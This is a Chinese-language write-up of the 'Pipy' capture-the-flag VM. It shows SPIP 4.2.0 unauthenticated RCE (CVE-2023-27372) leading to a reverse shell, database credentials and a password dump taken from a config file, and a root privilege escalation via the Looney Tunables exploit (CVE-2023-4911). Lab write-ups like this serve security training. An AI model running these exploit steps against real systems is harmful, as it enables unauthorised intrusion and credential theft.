# Pipy

:::note

[Linux VM] [Tested on VirtualBox] created by || ruycr4ft

⏲️ Release Date // 2023-10-18

✔️ MD5 // ed365ef516cedb5549dfcc84c84d3fd7

☠ Root // 68

💀 User // 72

📝Notes //
Really easy box to learn very recent privesc :D

:::

## 靶机启动

靶机 IP:

```plaintext
192.168.56.120
```

## nmap 信息搜集

```plaintext
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c0:f6:a1:6a:53:72:be:8d:c2:34:11:e7:e4:9c:94:75 (ECDSA)
|_  256 32:1c:f5:df:16:c7:c1:99:2c:d6:26:93:5a:43:57:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Mi sitio SPIP
|_http-generator: SPIP 4.2.0
MAC Address: 08:00:27:6A:EE:5B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 探测 web 服务

![access /](img/image_20240220-212057.png)

执行目录探测

```shell
[20:42:03] 200 -    7KB - /CHANGELOG.md
[20:42:04] 200 -   34KB - /LICENSE
[20:42:04] 200 -  842B  - /README.md
[20:42:14] 200 -    2KB - /composer.json
[20:42:14] 200 -   27KB - /composer.lock
[20:42:14] 301 -  317B  - /config  ->  http://192.168.56.120/config/
[20:42:15] 200 -    2KB - /config/
[20:42:20] 200 -    4KB - /htaccess.txt
[20:42:21] 200 -    7KB - /index.php
[20:42:21] 200 -    7KB - /index.php/login/
[20:42:22] 301 -  321B  - /javascript  ->  http://192.168.56.120/javascript/
[20:42:23] 301 -  316B  - /local  ->  http://192.168.56.120/local/
[20:42:23] 200 -    2KB - /local/
[20:42:36] 200 -    3KB - /tmp/
[20:42:37] 200 -    1KB - /tmp/sessions/
[20:42:38] 200 -    0B  - /vendor/composer/autoload_psr4.php
[20:42:38] 200 -    2KB - /vendor/
[20:42:38] 200 -    0B  - /vendor/autoload.php
[20:42:38] 200 -    0B  - /vendor/composer/autoload_classmap.php
[20:42:38] 200 -    0B  - /vendor/composer/autoload_files.php
[20:42:38] 200 -    0B  - /vendor/composer/autoload_real.php
[20:42:38] 200 -    0B  - /vendor/composer/autoload_static.php
[20:42:38] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[20:42:38] 200 -    0B  - /vendor/composer/ClassLoader.php
[20:42:38] 200 -   15KB - /vendor/composer/installed.json
[20:42:38] 200 -    1KB - /vendor/composer/LICENSE
```

根据目录扫描以及 README 文件内的信息，可以确定是 SPIP 框架

根据浏览器插件以及服务端指纹的识别，可以确定为 SPIP 4.2.0

根据相关信息，定位到这个 exp[SPIP v4.2.0 - Remote Code Execution (Unauthenticated) - exploit-db](https://www.exploit-db.com/exploits/51536)

尝试进行利用

```shell
(env) ┌─[randark@parrot]─[~/exps]
└──╼ $python3 CVE-2023-27372.py -u http://192.168.56.120/ -v -c "bash  reverse.sh"
[+] Anti-CSRF token found : iYe2q77AjJpzr7DiCN466DffCNPeUp0xMFqKM8HZ2jA5IWNjp6Vhzoioj1CV4d/wM8wzPYKIJAYCiLEY+fBNfgPHcNshG3+b
```

```shell
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs -lp 9999
[21:35:48] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
[21:35:52] received connection from 192.168.56.120:49260                                                                                                                                                                         bind.py:84
[21:35:52] 192.168.56.120:49260: registered new host w/ db                                                                                                                                                                   manager.py:957
(local) pwncat$ back
(remote) www-data@pipy:/var/www/html$ whoami
www-data
```

获得初步立足点

## 尝试提权至正常用户

```plaintext title="PEASS-ng"
/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ Users with console
angela:x:1000:1000:Angela:/home/angela:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 3 www-data www-data 4096 Oct  3 15:36 /var/www/html/vendor/algo26-matthias/idna-convert/.github
```

检测到存在 mysql 数据库，并且检测到历史操作记录

```shell title="/var/www/.bash_history"
whoami
exit
exit
reset xterm
export TERM=xterm-256color
stty rows 51 cols 197
ls
nano
ls
cat config/connect.php
mysql -u root -p
```

并能读取到配置文件中的数据库凭据

```php title="/var/www/html/config/connect.php"
<?php
if (!defined("_ECRIRE_INC_VERSION")) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql','spip','','');
```

尝试连接数据库

```sql
MariaDB [mysql]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| spip               |
| sys                |
+--------------------+
5 rows in set (0.000 sec)

MariaDB [mysql]> use spip;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [spip]> show tables;
+-------------------------+
| Tables_in_spip          |
+-------------------------+
| spip_articles           |
| spip_auteurs            |
| spip_auteurs_liens      |
| spip_depots             |
| spip_depots_plugins     |
| spip_documents          |
| spip_documents_liens    |
| spip_forum              |
| spip_groupes_mots       |
| spip_jobs               |
| spip_jobs_liens         |
| spip_meta               |
| spip_mots               |
| spip_mots_liens         |
| spip_paquets            |
| spip_plugins            |
| spip_referers           |
| spip_referers_articles  |
| spip_resultats          |
| spip_rubriques          |
| spip_syndic             |
| spip_syndic_articles    |
| spip_types_documents    |
| spip_urls               |
| spip_versions           |
| spip_versions_fragments |
| spip_visites            |
| spip_visites_articles   |
+-------------------------+
28 rows in set (0.000 sec)

MariaDB [spip]> select * from spip_auteurs;
+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id_auteur | nom    | bio | email           | nom_site | url_site | login  | pass                                                         | low_sec | statut    | webmestre | maj                 | pgp | htpass | en_ligne            | alea_actuel                       | alea_futur                       | prefs                                                                                                               | cookie_oubli                                                                                                                                         | source | lang | imessage | backup_cles                                                                                                                                                                                                                                                                  |
+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|         1 | Angela |     | angela@pipy.htb |          |          | angela | 4ng3l4                                                       |         | 0minirezo | oui       | 2023-10-04 17:28:39 |     |        | 2023-10-04 13:50:34 | 387046876651c39a45bc836.13502903  | 465278670651d6da4349d85.01841245 | a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";} | NULL                                                                                                                                                 | spip   |      |          | 3HnqCYcjg+hKOjCODrOTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4OGRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSOI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXOCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhOY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM= |
|         2 | admin  |     | admin@pipy.htb  |          |          | admin  | $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2 |         | 1comite   | non       | 2023-10-04 17:31:03 |     |        | 2023-10-04 17:31:03 | 1540227024651d7e881c21a5.84797952 | 439334464651da1526dbb90.67439545 | a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";} | 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o= | spip   | fr   | oui      |                                                                                                                                                                                                                                                                              |
+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

得到 Angela 的凭据：

```plainyexy
angela:4ng3l4
```

成功登录 Angela 的账户

```shell
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs angela@192.168.56.120
[21:59:30] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
Password: ******
[21:59:39] 192.168.56.120:22: registered new host w/ db                                                                                                                                                                      manager.py:957
(local) pwncat$ back
(remote) angela@pipy:/home/angela$ whoami
angela
```

## user pwned

```shell
(remote) angela@pipy:/home/angela$ cat user.txt
dab37650d43787424362d5805140538d
```

## 尝试提权到 root

```plaintext title="find / -perm -u=s -type f 2>/dev/null"
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/su
/usr/bin/pkexec
```

经过 **作弊（查看别人的 Writeup）**，可以定位到这个漏洞：CVE-2023-4911 - [PoC of CVE-2023-4911 "Looney Tunables"](https://github.com/leesh3288/CVE-2023-4911#poc-of-cve-2023-4911-looney-tunables)

尝试利用

```shell
(remote) angela@pipy:/home/angela/CVE-2023-4911$ ls -lh
total 16K
-rw-r--r-- 1 angela angela 3.8K Feb  1 14:23 exp.c
-rw-r--r-- 1 angela angela  390 Feb  1 14:23 gen_libc.py
-rw-r--r-- 1 angela angela  179 Feb  1 14:23 Makefile
-rw-r--r-- 1 angela angela  717 Feb  1 14:23 README.md
(remote) angela@pipy:/home/angela/CVE-2023-4911$ make
gcc -o exp exp.c
python3 gen_libc.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/angela/.cache/.pwntools-cache-3.10/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[!] An issue occurred while checking PyPI
[*] You have the latest version of Pwntools (4.11.0)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
./exp
try 100
try 200
# whoami
root
```

## root pwned

```shell
# cat root.txt
ab55ed08716cd894e8097a87dafed016
```
